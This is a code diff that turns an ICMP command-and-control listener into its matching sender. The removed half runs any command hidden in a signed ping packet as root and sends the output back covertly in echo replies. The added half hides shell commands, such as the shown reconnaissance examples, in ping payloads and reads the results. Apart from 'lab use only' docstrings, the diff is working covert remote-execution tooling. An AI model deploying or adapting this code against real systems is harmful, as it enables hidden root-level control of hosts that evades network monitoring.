@@ -1,29 +1,28 @@
 #!/usr/bin/env python3
 """
-ICMP Command & Control Listener – LAB / RESEARCH USE ONLY
-Listens for ICMP echo requests containing commands after SIGNATURE.
-Executes them in background thread and sends output back in echo reply when done.
+ICMP Command Sender (client) — LAB/RESEARCH USE ONLY
 
-WARNING: This executes arbitrary commands as root. Extremely dangerous.
-Use ONLY in isolated virtual lab environment you fully control.
+Sends commands hidden in ICMP echo request payload.
+Waits for command output in matching ICMP echo reply.
+
+Usage:
+    sudo python3 icmp_sender.py 192.168.56.101 "whoami; id; uname -a"
 """
 
 import socket
 import struct
-import subprocess
 import sys
-import os
+import select
 import time
-import threading
-import atexit
+import os
 
 # ────────────────────────────────────────────────
-SIGNATURE         = b"RUN_CMD:"           # must match sender
+SIGNATURE         = b"RUN_CMD:"      # Must match the listener
 ICMP_ECHO_REQUEST = 8
 ICMP_ECHO_REPLY   = 0
-MAX_RECV          = 9216                  # keep under typical MTU troubles
-REPLY_TRUNCATE    = 3800                  # many networks drop > ~4 kB ICMP
-DEFAULT_TIMEOUT   = 30                    # command timeout in seconds
+DEFAULT_TIMEOUT   = 8.0              # seconds
+MAX_RECV          = 16384            # many systems drop > 8–16 kB ICMP
+RECV_CHUNK        = 8192
 # ────────────────────────────────────────────────
 
 def icmp_checksum(data: bytes) -> int:
@@ -37,151 +36,111 @@ def icmp_checksum(data: bytes) -> int:
     return (~s) & 0xffff
 
 
-def build_icmp_reply(ident: int, seq: int, payload: bytes) -> bytes:
-    header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, 0, ident, seq)
-    full = header + payload
-    chksum = icmp_checksum(full)
-    header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, chksum, ident, seq)
+def build_icmp_echo_request(ident: int, seq: int, payload: bytes) -> bytes:
+    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, 0, ident, seq)
+    packet = header + payload
+    chksum = icmp_checksum(packet)
+    header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, chksum, ident, seq)
     return header + payload
 
 
-def run_command_in_thread(sock, src_ip, ident, seq, command):
-    def target():
-        output_str = safe_run_command(command)
+def receive_reply(sock, expected_ident: int, expected_seq: int, timeout: float):
+    start = time.monotonic()
+    buf = bytearray()
 
-        # Safety: truncate very large replies
-        if len(output_str) > REPLY_TRUNCATE:
-            output_str = output_str[:REPLY_TRUNCATE - 60] + "\n[output truncated - too large]"
-
-        # Encode only when sending
-        output_bytes = output_str.encode("utf-8", errors="replace")
-
-        reply_packet = build_icmp_reply(ident, seq, output_bytes)
+    while time.monotonic() - start < timeout:
+        rlist, _, _ = select.select([sock], [], [], 1.0)
+        if not rlist:
+            continue
 
         try:
-            sock.sendto(reply_packet, (src_ip, 0))
-            print(f"[sent reply] {len(output_bytes)} bytes → {src_ip} (from thread)")
+            packet, (src_ip, _) = sock.recvfrom(MAX_RECV)
+        except BlockingIOError:
+            continue
         except Exception as e:
-            print(f"[send failed → {src_ip}] {e}")
+            print(f"[recv error] {e}")
+            return None, None
 
-    thread = threading.Thread(target=target, daemon=True)
-    thread.start()
+        if len(packet) < 28:  # min IPv4 + ICMP header
+            continue
 
+        ip_hlen = (packet[0] & 0x0F) * 4
+        if len(packet) < ip_hlen + 8:
+            continue
 
-def safe_run_command(cmd: str) -> str:
-    if not cmd.strip():
-        return "[empty command received]\n"
+        icmp = packet[ip_hlen:ip_hlen+8]
+        typ, code, _, ident, seq = struct.unpack("!BBHHH", icmp)
 
-    print(f"→ executing in background: {cmd}")
+        if typ != ICMP_ECHO_REPLY:
+            continue
+        if ident != expected_ident or seq != expected_seq:
+            continue
 
-    try:
-        result = subprocess.run(
-            cmd,
-            shell=True,
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            timeout=DEFAULT_TIMEOUT,
-            text=True,                          # returns str, not bytes
-            env=os.environ.copy()
-        )
-        output = result.stdout
-        if result.returncode != 0:
-            output += f"\n[!!] exited with code {result.returncode}"
-        return output or "[command ran - no output]"
-    except subprocess.TimeoutExpired:
-        return f"[TIMEOUT after {DEFAULT_TIMEOUT}s]"
-    except Exception as e:
-        return f"[execution failed] {type(e).__name__}: {e}"
+        # This is our reply
+        payload = packet[ip_hlen + 8:]
+        return payload, src_ip
+
+    return None, None
 
 
-# Global variable for original ICMP echo ignore setting
-original_icmp_echo_ignore = None
-
-def restore_icmp_echo_ignore():
-    if original_icmp_echo_ignore is not None:
-        try:
-            with open('/proc/sys/net/ipv4/icmp_echo_ignore_all', 'w') as f:
-                f.write(original_icmp_echo_ignore)
-            print("[+] Restored original ICMP echo ignore setting")
-        except Exception as e:
-            print(f"[!] Failed to restore ICMP setting: {e}")
-
-
-def main():
-    global original_icmp_echo_ignore
-
+def send_command(target: str, command: str, timeout: float = DEFAULT_TIMEOUT):
     if os.geteuid() != 0:
-        print("[!] This script must run as root", file=sys.stderr)
+        print("[!] This script must run as root (sudo)", file=sys.stderr)
         sys.exit(1)
-
-    # Read and set icmp_echo_ignore_all to 1 to prevent kernel replies
-    try:
-        with open('/proc/sys/net/ipv4/icmp_echo_ignore_all', 'r') as f:
-            original_icmp_echo_ignore = f.read().strip()
-        with open('/proc/sys/net/ipv4/icmp_echo_ignore_all', 'w') as f:
-            f.write('1')
-        print("[+] Disabled kernel ICMP echo replies (set icmp_echo_ignore_all=1)")
-        atexit.register(restore_icmp_echo_ignore)
-    except Exception as e:
-        print(f"[!] Warning: Failed to disable kernel ICMP replies: {e}")
-        print("[!] The script may not work properly due to duplicate replies.")
-        print("[!] Run manually: echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all")
 
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4*1024*1024)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2*1024*1024)
     except Exception as e:
-        print(f"[!] Failed to create raw ICMP socket: {e}", file=sys.stderr)
+        print(f"[!] Failed to create raw socket: {e}", file=sys.stderr)
         sys.exit(1)
 
-    print("[+] ICMP command listener started")
-    print(f"[+] Waiting for packets with prefix: {SIGNATURE!r}")
-    print("[+] Commands run in background threads")
-    print("[+] Press Ctrl+C to stop\n")
+    ident = 0xBEEF              # easily recognizable
+    seq   = int(time.time()) % 65536
 
-    while True:
-        try:
-            packet, (src_ip, _) = sock.recvfrom(MAX_RECV)
-        except KeyboardInterrupt:
-            print("\n[!] Shutting down.")
-            restore_icmp_echo_ignore()
-            break
-        except Exception as e:
-            print(f"[recv error] {e}")
-            time.sleep(0.3)
-            continue
+    payload = SIGNATURE + command.strip().encode("utf-8", errors="replace")
+    if len(payload) > 1400:
+        print(f"[!] Warning: payload is {len(payload)} bytes — may be dropped/fragmented")
 
-        if len(packet) < 28:
-            continue
+    request = build_icmp_echo_request(ident, seq, payload)
 
-        ip_header_len = (packet[0] & 0x0F) * 4
-        if len(packet) < ip_header_len + 8:
-            continue
+    print(f"[>] Sending to {target}  |  cmd: {command!r}")
+    print(f"[>] payload size: {len(payload)} bytes")
 
-        icmp_header = packet[ip_header_len : ip_header_len + 8]
-        icmp_type, _, _, ident, seq = struct.unpack("!BBHHH", icmp_header)
+    try:
+        sock.sendto(request, (target, 0))
+    except Exception as e:
+        print(f"[!] sendto failed: {e}")
+        sock.close()
+        return
 
-        if icmp_type != ICMP_ECHO_REQUEST:
-            continue
+    print("[*] Waiting for reply...")
 
-        payload = packet[ip_header_len + 8:]
-        if not payload.startswith(SIGNATURE):
-            # For non-signed packets, do NOT reply (kernel is disabled)
-            continue
+    result, src = receive_reply(sock, ident, seq, timeout)
 
-        try:
-            command = payload[len(SIGNATURE):].decode("utf-8", errors="replace").strip()
-        except:
-            command = "<decode failed>"
+    sock.close()
 
-        if not command:
-            continue
+    if result is None:
+        print("[!] No matching ICMP reply received within timeout.")
+        return
 
-        print(f"[!] {src_ip} sent command: {command!r}")
-
-        # Spawn background thread to run command and send reply when done
-        run_command_in_thread(sock, src_ip, ident, seq, command)
+    print(f"\n[✓] Reply from {src}")
+    print("─" * 60)
+    try:
+        print(result.decode("utf-8", errors="replace"))
+    except:
+        print("[binary or malformed data]")
+        print(result.hex(" ", -1))
+    print("─" * 60)
 
 
 if __name__ == "__main__":
-    main()
+    if len(sys.argv) != 3:
+        print(f"Usage:   sudo {sys.argv[0]} <target_ip> \"command here\"")
+        print("Example: sudo {sys.argv[0]} 192.168.1.55 \"whoami ; id ; pwd ; cat /etc/hostname\"")
+        sys.exit(1)
+
+    target_ip = sys.argv[1]
+    command   = sys.argv[2]
+
+    send_command(target_ip, command)
